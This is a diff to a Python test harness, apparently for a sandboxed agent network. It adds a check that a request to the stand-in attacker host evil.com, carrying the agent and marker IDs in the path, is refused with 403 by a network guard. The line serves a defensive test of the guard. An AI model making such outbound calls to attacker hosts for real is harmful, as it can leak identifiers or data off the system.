@@ -237,6 +237,14 @@ def seed_owned_flow(agent: str, marker: str) -> dict:
     return {"agent_id": agent, "flow_id": owned[0]["id"], "request_id": request_id}
 
 
+def operator_traffic(agent: str, marker: str) -> dict:
+    """Observe fresh owned traffic and policy refusal in the selected guest."""
+    allowed = seed_owned_flow(agent, marker)
+    denied = exchange("GET", f"http://evil.com/installed-flow/{marker}/{agent}")
+    assert denied[0] == 403 and denied[1].get("x-blocked-by") == "network-guard", denied[:2]
+    return {"allowed": allowed, "denied_status": denied[0], "blocked_by": denied[1]["x-blocked-by"]}
+
+
 def reject_peer_flow(agent: str, peer: str, foreign_id: int, foreign_request: str) -> dict:
     """Keep a populated own search while rejecting a known live peer's detail."""
     search = api("POST", "/api/flows/search", payload={"host": FLOW_HOST, "limit": 100})
@@ -364,6 +372,8 @@ def main() -> None:
             result = context_and_evidence(args.agent, args.marker)
         case "flow-seed":
             result = seed_owned_flow(args.agent, args.marker)
+        case "operator-traffic":
+            result = operator_traffic(args.agent, args.marker)
         case "flow-peer-denial":
             result = reject_peer_flow(args.agent, args.peer, args.flow_id, args.message)
         case "coord-join":
